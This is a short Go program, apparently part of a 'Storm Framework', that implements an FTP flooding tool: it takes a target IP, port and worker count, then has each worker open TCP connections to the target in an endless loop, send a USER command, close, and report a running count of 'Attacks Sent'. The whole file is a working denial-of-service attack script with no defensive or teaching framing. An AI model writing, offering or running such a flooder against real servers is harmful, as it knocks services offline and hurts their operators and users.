// GPL License.
// Copyright (c) 2026 Storm Framework
// See LICENSE file in the project root for full license information.
package main
import (
	"flag"
	"fmt"
	"net"
	"sync"
	"sync/atomic"
	"time"
)
var count uint64 // Counter global
func flood(target string, port int, wg *sync.WaitGroup) {
	defer wg.Done()
	address := fmt.Sprintf("%s:%d", target, port)
	for {
		conn, err := net.DialTimeout("tcp", address, 2*time.Second)
		if err != nil {
			continue
		}
		conn.Write([]byte("USER test connection 0a000128 0x0000\r\n"))
		atomic.AddUint64(&count, 1)
		conn.Close()
	}
}

func main() {
	target := flag.String("t", "", "Target IP")
	port := flag.Int("p", 21, "Target Port")
	threads := flag.Int("w", 10, "Number of Workers")
	flag.Parse()

	if *target == "" {
		fmt.Println("Usage: ftp_flood -t <target> -p <port> -w <workers>")
		return
	}

	go func() {
		for {
			current := atomic.LoadUint64(&count)
			fmt.Printf("\r[*] Attacks Sent: %d", current)
			time.Sleep(1 * time.Second)
		}
	}()

	var wg sync.WaitGroup
	for i := 0; i < *threads; i++ {
		wg.Add(1)
		go flood(*target, *port, &wg)
	}
	wg.Wait()
}
